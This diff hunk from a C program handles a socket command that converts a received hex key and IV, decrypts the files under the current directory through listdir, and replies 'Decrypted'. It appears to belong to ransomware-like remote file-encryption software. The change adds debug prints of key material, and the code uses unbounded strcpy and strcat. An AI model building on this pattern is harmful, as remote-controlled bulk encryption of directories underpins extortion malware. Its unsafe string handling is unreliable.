@@ -148,16 +148,20 @@ int main (int argc, char * argv[])
             strToken = strtok(NULL, separator);
             strcpy(pIv, strToken);
             size = strlen(pIv);
+            printf("%s\n", key);
+            printf("%s\n", iv);
             pIv[size-1] = '\0';  //removing \n from the iv
-            printf("%s\n", pKey);
-            printf("%s\n", pIv);
-            hexa_to_bytes(pKey, key,65);
-            hexa_to_bytes(pIv, iv,65);
+            hexa_to_bytes(pKey, key,33);
+            hexa_to_bytes(pIv, iv,33);
             char response[2048];
             strcpy(response, cwd);
             strcat(response, " ");
             strcat(response, "Decrypted\n");
 
+            printf("%s\n", key);
+            printf("%s\n", iv);
+            printf("%s\n", pKey);
+            printf("%s\n", pIv);
 
             listdir((const char *)cwd, (unsigned char *)iv, (unsigned char *)key, 'd');
             send(sockid, (const char *)response, strlen(response)+1,0);
